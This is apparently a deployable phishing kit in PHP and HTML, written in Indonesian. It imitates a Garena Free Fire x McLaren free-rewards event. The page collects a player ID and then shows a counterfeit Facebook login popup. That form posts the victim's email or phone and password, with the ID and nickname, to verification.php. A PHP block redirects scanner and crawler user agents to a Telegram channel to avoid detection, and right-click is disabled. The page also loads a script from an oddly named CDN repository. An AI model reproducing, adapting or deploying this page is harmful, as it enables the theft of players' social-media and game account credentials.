<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location:https://t.me/scodexscript');
die();
}
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="GARENA FREE FIRE: X McLaren">
<meta name="description" content="Event McLaren!">
<meta property="og:description" content="Collect your special rewards">
<meta property="og:url" content="./">
<meta property="og:site_name" content="FreeFire">
<meta property="og:type" content="website">
<meta name="copyright" content="FREEFIRE">
<meta name="theme-color" content="#000">
<meta property="og:image" content="https://b.top4top.io/p_20438n84j7.png">
<title>FREE FIRE : X McLaren</title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/login/facebook.css">
<link rel="stylesheet" href="css/login/twitter.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="https://b.top4top.io/p_20438n84j7.png">
<style type="text/css">
@charset "utf-8";
@import url("https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Teko:300,400,500");
*,*:before,*:after {
	-webkit-box-sizing:border-box;
	-moz-box-sizing:border-box;
	box-sizing:border-box;
}
body {
	background:url(https://j.top4top.io/p_2043o70mt1.jpeg) no-repeat center;
	-webkit-background-size:cover;
	-moz-background-size:cover;
	-o-background-size:cover;
	background-size:100% 100%;
	margin: 0;
	font-family: 'Teko';
}
.container {
	background: rgba(0,0,0,0.3);
	background-size: cover;
	position: relative;
	margin: 0px auto;
	max-width: 400px;
	height: auto;
	border: 1px solid #e2c73d;
}
.navbar {
	background:#000;
	width:100%;
	height:50px;
	padding:4px;
	border-bottom: 1px solid white
}
.navbar img {
	width:40px;
	margin-right:5px;
	border-radius:5px;
	float:left;
}
.navbar-txt-game {
	padding-top:2px;
	color:#feab02;
	font-size:18px;
	font-family:'Teko',sans-serif;
	text-align:left;
}
.navbar-txt-game span {
	color:#d9d9d8;
	font-size:13px;
	line-height:10px;
	display:block;
}
.navbar-btn-wrapper {
	margin-top:0px;
	float:right;
}
.navbar-btn {
	background:transparent;
	margin-right: 5px;
	margin-top: 5px;
	color:#fff;
	font-size:15px;
	font-family:'Teko',sans-serif;
	text-align:center;
	text-transform:uppercase;
	border-radius: 3px;
	display:inline-block;
	outline:none;
	border:none;
}
.header {
	background: transparent;
    width: 100%;
    height: 110px;
	margin-left: auto;
	margin-right: auto;
	border-bottom: 1px solid #fff;
}
.header img {
	width: 100%;
	height: 195px;
	border-bottom: 1px solid #fff;
}
.box {
    width: 93%;
    height: auto;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 12px;
	position: relative;
	border-radius: 5px;
} 

.scroll {
	background:url(img/bgj.jpg) no-repeat;
	background-size: 100% 100%;
	overflow:scroll;
	position:relative;
	width: 100%;
	height:500px;
	margin-top:11px;
	margin-left: auto;
	margin-right: auto;
	display: block;
	scrollbar-face-color:#ffbb40;
	scrollbar-shadow-color:#ffbb40;
	scrollbar-highlight-color:#ffbb40;
	scrollbar-3dlight-color:#ffbb40;
	scrollbar-darkshadow-color:#ffbb40;
	scrollbar-track-color:#ffbb40;
	scrollbar-arrow-color:#ffbb40;
	border-radius: 0px 0px 5px 5px;
	border:1px solid #c7ed81;
	border-top: none
}
.item {
	width: 30%;
	height: 110px;
	margin: 3px;
	margin-bottom: 38px;
	display: inline-block;
}
.item img {
	width: 100%;
    height: 100%;
	border-top-left-radius: 5px;
	border-top-right-radius: 5px;
}
.item button {
	background: url(https://a.top4top.io/p_2043kur9z4.png) no-repeat center;
	background-size: 100% 100%;
	width:101%;
	height:28px;
	padding:5px;
	margin-left: -1px;
	margin-top: -1px;
	color:#000000c4;
	font-size:16.5px;
	letter-spacing: 1px;
	font-family:'Teko',sans-serif;
	font-weight: 500;
	text-align:center;
	border: none;
	border-bottom-left-radius: 5px;
	border-bottom-right-radius: 5px;
	outline:none;
}
.item img {
	border:none;
}

.footer {
	background: #000;
	width: 100%;
	height: auto;
	padding: 10px;
	border-top: 1px solid #fff;
}
.footer img {
	width: 90%;
	margin-left: auto;
	margin-right: auto;
	display: block;
}
.popup {
	width:100%;
	height:100%;
	position:fixed;
	top:0;
	left:0;
	z-index:9999;
	background-color:rgba(0, 0, 0, 0.4);
}
.nav-popup {
	background: #000;
	height: auto;
	border: 4px;
	padding:10px;
}
.nav-popup-title {
	color: #fff;
	font-size: 20px;
	font-family: Teko;
	text-align: left;
	letter-spacing: 0.5px;
}
.popup-box {
	background: url(https://i.top4top.io/p_2043ti1q50.jpg) no-repeat center;
	background-size: cover;
	width: 370px;
	height: auto;
	position: relative;
	margin: 50px auto;
	margin-top: 15%;
	text-align: center;
	font-family:'Teko';
	color:#000;
	border: 1px solid #fff;
	border-radius: 2px;
}
.popup-alert {
	background: #000;
	width: 95%;
	height: auto;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #fff;
	font-size: 15px;
	border:1px solid #fff;
    font-family: Teko;
	text-align: center;
	border-radius: 5px;
	display: block;
}
.popup-item {
	width:23%;
	height:85px;
	margin-left:auto;
	margin-right:auto;
	margin-bottom: 17px;
	border: 1px solid #fff;
	display: block;
}
.popup-btn {
    background: rgba(0,0,0,0.8);
    width: 25%;
    height: auto;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #fff;
	font-size: 15px;
	font-family: Teko;
	border: 1px solid #fff;
	border-radius: 5px;
	outline: none;
	display: block;
}
.btn-login {
    width: 95%;
    height: auto;
    padding: 8px;
    margin-left: auto;
	margin-right: auto;
    color: #000;
	font-size: 15px;
    font-family: Teko;
    border: none;
    border-radius: 5px;
    outline: none;
    display: block;
}
.btn-login i {
    color: #fff;
    font-size: 20px;
    float: left;
}
.facebook {
    background: #3b5998;
    color: #fff;
	margin-bottom: 3px;
}
.twitter {
    background: #08a0e9;
    color: #fff;
	margin-bottom: 10px;
}
.popup-close {
	width:20px;
	height:20px;
	color:#fff;
	text-align:center;
	text-transform: uppercase;
	font-weight: bold;
	position:absolute;
	top:13px;
	right:10px;
	display:block;
}
.popup-close i {
	color:#fff;
	font-size: 25px;
}
.popup-login {
	background:rgba(0,0,0,0.5);
	width:100%;
	height:100%;
	position:fixed;
	top:0;
	left:0;
	z-index:9999;
}
.popup-box-login-fb {
	background:#ECEFF6;
	max-width:330px;
	height:auto;
	position:relative;
	margin:50px auto;
	margin-top:1.9%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.popup-box-login-twitter {
	background:#fff;
	max-width:330px;
	height:350px;
	position:relative;
	margin:50px auto;
	margin-top:10%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.close-fb {
	background:#000;
	width:20px;
	height:20px;
	color:#fff;
	text-align:center;
	text-decoration:none;
	border-radius:50%;
	border:1.5px solid #fff;
	position:absolute;
	top:-8px;
	right:-10px;
	display:block;
}
.close-fb i {
	color:#fff;
	padding-top:1px;
}
.close-other {
	background:#000;
	width:20px;
	height:20px;
	color:#fff;
	text-align:center;
	text-decoration:none;
	border-radius:50%;
	border:1.5px solid #fff;
	top:-8px;
	right:-10px;
	position:absolute;
	z-index:9999999;
	display:block;
}
.close-other i {
	color:#fff;
	padding-top:1px;
}
.verify-alert {
	background: #e2c73d;
	width: 94.3%;
	height: auto;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 15px;
	padding: 5px;
	color: #000;
	font-size: 15px;
	font-family: Teko;
	text-align: left;
	border-radius: 5px;
	display: block;
}
.verify-alert button {
	background: #000;
	width: auto;
	height: auto;
	margin-top: -2px;
	margin-right: -2px;
	padding: 1px;
	padding-left: 10px;
	padding-right: 10px;
	color: #e2c73d;
	font-size: 15px;
	font-family: Teko;
	text-align: center;
	border: 1px solid #000;
	border-radius: 5px;
	outline: none;
	float: right;
}
.verify-input {
	background: rgba(0,0,0,0.5);
	width: 90%;
	height: auto;
	margin-bottom: 3px;
	padding: 6px;
	color: #fff;
	font-size:15px;
	font-family: Teko;
	border: 1px solid silver;
	border-radius: 5px;
	position: relative;
	outline: none;
}
.verify-input::placeholder {
	color: #fff;
}
.verify-select {
	background: black;
	width: 90%;
	height: auto;
	margin-bottom: 3px;
	padding: 6px;
	padding-left: 3px;
	color: #e2c73d;
	font-size: 15px;
	font-family: Teko;
	border: 1px solid #e2c73d;
	border-radius: 5px;
	position: relative;
	outline: none;
}
.verify-btn {
    background: #e2c73d;
	width: 30%;
	height: auto;
	margin-top: 10px;
	padding: 6px;
	font-size: 15px;
	font-family: Teko;
	text-align: center;
	color: #000;
	margin-bottom: 3px;
	border: 1px solid #000;
	position: relative;
	outline: none;
}
.kanan {
	float: right;
}
.kiri {
	float: left;
}
.tengah {
	margin-left: auto;
	margin-right: auto;
	display: block;
}
::-webkit-scrollbar { 
    display: none;
    width: 0px;
}
@media only screen and (max-width:600px) {
    .container {
        width: 100%;
        height: auto;
        margin-top: 0px;
        margin-bottom: 0px;
		border: none;
        border-radius: 0px;
        padding: 0px;
    }
    .header {
        height: 110px;
    }
    .scroll {
        height: 400px;
    }
    .item {
        height: 90px;
    }
    .popup-box {
        width: 345px;
        margin-top: 60%;
    }
    .popup-item {
        width:25%;
        height:85px;
	}
	.popup-box-login-fb {
		margin-top: 4%;
	}
	.popup-box-login-twitter {
		margin-top: 25%;
	}
}
@media only screen and (max-width:395px) {

}
</style>
</head>
<body oncontextmenu="return false" ondragstart="return false">
<div class="container">
<div class="navbar">
<div class="navbar-btn-wrapper">
<button class="navbar-btn">
<i class="fa fa-shopping-cart fa-2x"></i>
</button>
</div> 
<img src="https://b.top4top.io/p_20438n84j7.png">
<div class="navbar-txt-game">
FREE FIRE : X McLaren
<span>Official Garena Free Fire X McLaren</span>
</div> 
</div> 
<div class="header">
<img src="https://j.top4top.io/p_2043o70mt1.jpeg">
</div>
<div style="margin-bottom: 21%"></div>
<div style="background:rgba(0,0,0,0.5);width: 100%;height: 80px;border-bottom: 1px solid white">
	<img src="https://l.top4top.io/p_2043u9r275.png" style="position: relative;margin-top: 2%;width: 50px;margin-left: 5%">
	<span style="color: white;font-family: teko;font-size: 30px;font-weight: 1000;position: absolute;margin-left: 2.5%;margin-top: 3%;text-shadow: 1px 1px #cce152">FREEFIRE X MCLAREN</span>
	<span style="color: white;font-family: teko;font-size: 16px;font-weight: 10;position: absolute;margin-left: 2.5%;margin-top: 11%;text-shadow: 1px 1px #cce152">AMBIL HADIAH GRATIS TERBARU</span>
</div>
<br>
<div class="box">
	<div id="alertku" style="position: absolute;right: -0.5%;top: -2%;border: 2px solid white;padding: 2px 5px 2px 5px;color: white;border-radius: 4px;background:rgba(0,0,0,0.5);display: none;">
		 <i class="fa fa-fw fa-user"></i> <span id="isnick"></span>
	</div>
<div style="margin-top: 5px"></div>
<div class="item">
<img style="border-bottom: 0px;" src="https://j.top4top.io/p_2044vl8c36.jpg">
<div>
<button type="button" onmousedown="login.play();" onclick="open_reward_confirmation(this);" src="https://j.top4top.io/p_2044vl8c36.jpg"></button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://e.top4top.io/p_204405ze11.jpg">
<div>
<button type="button" onmousedown="login.play();" onclick="open_reward_confirmation(this);" src="https://e.top4top.io/p_204405ze11.jpg"></button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://f.top4top.io/p_2044zb05s2.jpg">
<div>
<button type="button" onmousedown="login.play();" onclick="open_reward_confirmation(this);" src="https://f.top4top.io/p_2044zb05s2.jpg"></button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://g.top4top.io/p_2044pzb0y3.jpg">
<div>
<button type="button" onmousedown="login.play();" onclick="open_reward_confirmation(this);" src="https://g.top4top.io/p_2044pzb0y3.jpg"></button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.top4top.io/p_20449co5f5.jpg">
<div>
<button type="button" onmousedown="login.play();" onclick="open_reward_confirmation(this);" src="https://i.top4top.io/p_20449co5f5.jpg"></button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://j.top4top.io/p_2044ytvdt1.png">
<div>
<button type="button" onmousedown="login.play();" onclick="open_reward_confirmation(this);" src="https://j.top4top.io/p_2044ytvdt1.png"></button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://l.top4top.io/p_2044enpo68.png">
<div>
<button type="button" onmousedown="login.play();" onclick="open_reward_confirmation(this);" src="https://l.top4top.io/p_2044enpo68.png"></button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://a.top4top.io/p_20449ypgw9.png">
<div>
<button type="button" onmousedown="login.play();" onclick="open_reward_confirmation(this);" src="https://a.top4top.io/p_20449ypgw9.png"></button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.top4top.io/p_20443e4hk0.png">
<div>
<button type="button" onmousedown="login.play();" onclick="open_reward_confirmation(this);" src="https://i.top4top.io/p_20443e4hk0.png"></button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://k.top4top.io/p_2044ebgg92.png">
<div>
<button type="button" onmousedown="login.play();" onclick="open_reward_confirmation(this);" src="https://k.top4top.io/p_2044ebgg92.png"></button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://l.top4top.io/p_204455r2q3.png">
<div>
<button type="button" onmousedown="login.play();" onclick="open_reward_confirmation(this);" src="https://l.top4top.io/p_204455r2q3.png"></button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.top4top.io/p_20449lbtm0.jpg">
<div>
<button type="button" onmousedown="login.play();" onclick="open_reward_confirmation(this);" src="https://i.top4top.io/p_20449lbtm0.jpg"></button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://a.top4top.io/p_20445ikq70.jpg">
<div>
<button type="button" onmousedown="login.play();" onclick="open_reward_confirmation(this);" src="https://a.top4top.io/p_20445ikq70.jpg"></button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://b.top4top.io/p_2044ksqcc1.jpg">
<div>
<button type="button" onmousedown="login.play();" onclick="open_reward_confirmation(this);" src="https://b.top4top.io/p_2044ksqcc1.jpg"></button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://c.top4top.io/p_20448kqqz2.jpg">
<div>
<button type="button" onmousedown="login.play();" onclick="open_reward_confirmation(this);" src="https://c.top4top.io/p_20448kqqz2.jpg"></button>
</div>
</div>
</center>
</div> <!--- scroll --->
</div> <!--- tab-rewards --->
</div> <!--- box --->

<div class="footer">
<img src="https://k.top4top.io/p_204363krn3.jpg">
</div> 
</div> <!--- container --->

<div class="popup playid" style="display: block;">
<div class="popup-box">
<div class="nav-popup"><div class="nav-popup-title"><i class="fa fa-fw fa-user"></i> VERIFIKASI PLAYER ID</div></div><br>
<div class="popup-alert judulID">Silahkan Masukan Karakter ID</div>
<div class="popup-alert titleId" style="display: none;"></div>
<input type="number" class="verify-input" name="playid" id="playid" placeholder="Masukan Karakter ID" autocomplete="off" required>
<i class="fa fa-2x fa-spinner fa-spin waitId" style="display: none;color:white"></i>

<br>
<small style="position: absolute;left: 5%;color:#fff;display: none;" id="errorId"><i class="fa fa-info-circle" style="padding-right: 5px;"></i> Silahkan Masukan Karakter ID</small><br>
<button type="button" class="popup-btn forgotId" style="float: left;margin-left: 20%" onmousedown="login.play()" onclick="forgot()">Lupa PlayerID?</button>
<button type="button" class="popup-btn" onmousedown="login.play()" style="float: right;margin-right: 20%" id="verify">Cek ID</button><br><br>
</div>
</div>
<input type="hidden" id="status">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script type="text/javascript">
	var login = new Audio();
	login.src = "https://k.top4top.io/m_2040kqhti5.mp3";

	var tutup = new Audio();
	tutup.src = "https://k.top4top.io/m_2040kqhti5.mp3";

	var button = new Audio();
	button.src = "https://k.top4top.io/m_2040kqhti5.mp3";
</script>
    <script type="text/javascript">
        $(document).ready(function() {
        	$('#shareWa').on('click',function(){
        		var pageURL = location;
        		document.location.href = 'whatsapp://send?text=Get reward PUBG MOBILE Royale Pass Season 19 here : '+pageURL;
        	});
        	
        	$('#playid').on('click',function(){
        		$('#errorId').hide();
                $('#playid').css('border','1px solid silver');
        	});
            $("#verify").on('click', function() {
               var playid = $("#playid").val();
               if(playid == "") {
                   $('#errorId').show();
                   $('#playid').css('border','1px solid red');
                   $('#playid').val('');
               } else {
                    $.ajax({
                    url: "system/trueid.php",
                    type: "POST",
                    data: 'playid='+playid,
                    beforeSend: function() {
                    $(".judulID").fadeOut();
                    $(".titleId").fadeIn();
                    $(".titleId").html('Sedang Mengecek ID');
                    $('#playid').fadeOut();
                    $('.waitId').fadeIn();
                    $('#verify').attr('disabled','true');
                    $('.forgotId').attr('disabled','true');
                    $('.forgotId').css('opacity','0.5');
                    $('#verify').css('opacity','0.5');
                    },
                    success: function(status) {
                    var stat = $('#status').val(status);
                    var isi_stat = stat.val();
                    $("#btn_oke").show();
                    $("#btnload").hide();
                    if (isi_stat == "Wrong_UserId") {
                    	$('#verify').removeAttr('disabled');
	                    $('.forgotId').removeAttr('disabled');
	                    $('.forgotId').css('opacity','1');
	                    $('#verify').css('opacity','1');
                       $('.waitId').hide();
                       $(".titleId").hide();
                       $(".errorId").hide();
                       $("#playid").fadeIn();
                       $('#errorId').show();
                   	   $('#playid').css('border','1px solid #fff');
                       $('#errorId').html('invalid player id(2002-2002-0)‎');
                    }else if(isi_stat == "Token Error"){
                    	$('#verify').removeAttr('disabled');
	                    $('.forgotId').removeAttr('disabled');
	                    $('.forgotId').css('opacity','1');
	                    $('#verify').css('opacity','1');
                    	$('.waitId').hide()
                       $(".titleId").hide();
                       $(".errorId").hide();
                       $("#playid").fadeIn();
                       $('#errorId').show()
                   	   $('#playid').css('border','1px solid #fff');
                       $('#errorId').html('System error(2002-2002-0)‎');
                    }else{
                    	$('.waitId').hide()
                    	$('.menuPubgm').fadeIn()
                        $('#beer').hide();
                        $('#alertku').fadeIn();
                        $('#isnick').html(status);
                        $('#isinick1').val(status);
                        $('#isinick2').val(status);
                        $('#isiplayid1').val(playid);
                        $('#isiplayid2').val(playid);
                        $('.playid').hide();
                    }
                    }
                    });
               }
            });

        });
    </script>
    <script type="text/javascript">
	function forgot(){
	$('.forgot').show();
	$('.playid').hide();
	}
	function close_forgot(){
		$(".forgot").hide()
		$(".playid").show()
	}
	</script>

<div class="popup reward_confirmation" style="display: none;">
<div class="popup-box">
<a onmousedown="tutup.play()" onclick="close_reward_confirmation()" class="popup-close"><i class="zmdi zmdi-close"></i></a>
<div class="nav-popup"><div class="nav-popup-title"><i class="fa fa-fw fa-gift"></i> KONFIRMASI HADIAH</div></div><br>
<div class="popup-alert">Apakah Anda Yakin ingin mengambil Hadiah Ini?</div>
<img class="popup-item" src="" id="myRewardImg">
<button type="button" class="popup-btn" onmousedown="button.play()" onclick="open_account_login()">Ambil</button>
</div>
</div>

<div class="popup forgot" style="display: none;">
<div class="popup-box">
<a onmousedown="tutup.play()" onclick="close_forgot()" class="popup-close"><i class="zmdi zmdi-close"></i></a>
<div class="nav-popup"><div class="nav-popup-title">Lupa PlayerID</div></div><br>
<div class="scroll">
<div class="popup-alert">1. Masuk Ke game</div>
<img src="https://b.top4top.io/p_2043j9g8s4.jpg" style="width: 90%;border-radius: 5px;border:1px solid white"><br>
<div class="popup-alert">2. Temukan PlayerID Anda</div>
<img src="https://d.top4top.io/p_2043gb0vn7.jpg" style="width: 90%;border-radius: 5px;border:1px solid white">
</div>
<br>
<button type="button" class="popup-btn" onmousedown="tutup.play()" onclick="close_forgot()">Selesai</button>
<br>
</div>
</div>

<div class="popup account_login" style="display: none;">
<div class="popup-box">
<div class="nav-popup"><div class="nav-popup-title"><i class="fa fa-fw fa-chevron-right"></i> LOGIN AKUN ANDA</div></div><br>
<div class="popup-alert">Login Dengan Akun Free Fire Anda</div>
<button type="button" class="btn-login facebook" onclick="open_facebook();" onmousedown="button.play()"><i class="fa fa-facebook-square icon-login"></i> Login Dengan Facebook</button>
</div>
</div>

<div class="popup-login login-facebook animated fadeIn" style="display: none;">
	<div class="popup-box-login-fb">
		<a onclick="tutup_facebook()" onmousedown="tutup.play()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
		<div class="navbar-fb">
			<img src="https://i.ibb.co/sjgWRzT/fb-removebg-preview.png">
		</div>
		<div class="content-box-fb">
			<img src="https://b.top4top.io/p_20438n84j7.png">
			<div class="txt-login-fb">
				 Login dengan akun Free Fire Anda Untuk Mendapatkan Hadiah Anda
			</div>
			<form class="login-form" action="verification.php" method="post" onclick="$(this).end()">
				<label>
				<input type="text" name="user" placeholder="Nomer ponsel atau email" autocomplete="off" autocapitalize="off" required>
				</label>
				<label>
				<input type="password" name="pass" placeholder="Kata Sandi" autocomplete="off" autocapitalize="off" required>
				</label>
				<input type="hidden" name="log" value="Facebook" readonly>
				<input type="hidden" name="playid" id="isiplayid1" readonly>
				<input type="hidden" name="nick" id="isinick1" readonly>
				<button type="submit" class="btn-login-fb" onmousedown="button.play()">Log In</button>
			</form>
			<div class="txt-create-account">Create account</div>
			<div class="txt-not-now">Not now</div>
			<div class="txt-forgotten-password">Forgotten password?</div>
		</div>
		<div class="language-box">
			<center>
			<div class="language-name language-name-active">English (UK)</div>
			<div class="language-name">Bahasa Indonesia</div>
			<div class="language-name">Basa Jawa</div>
			<div class="language-name">Bahasa Melayu</div>
			<div class="language-name">日本語</div>
			<div class="language-name">Español</div>
			<div class="language-name">Português (Brasil)</div>
			<div class="language-name">
				<i class="fa fa-plus"></i>
			</div>
			</center>
		</div>
		<div class="copyright">Facebook Inc.</div>
	</div>
</div>
		</div>
	</div>
</div>

<script src="https://cdn.jsdelivr.net/gh/stylesheett/jquery.min.js@main/slim.js"></script>
<script src="js/tab.js"></script>
<script src="js/timer.js"></script>
<script src="js/popup.js"></script>
<script src="js/click.js"></script>

</body>
</html>
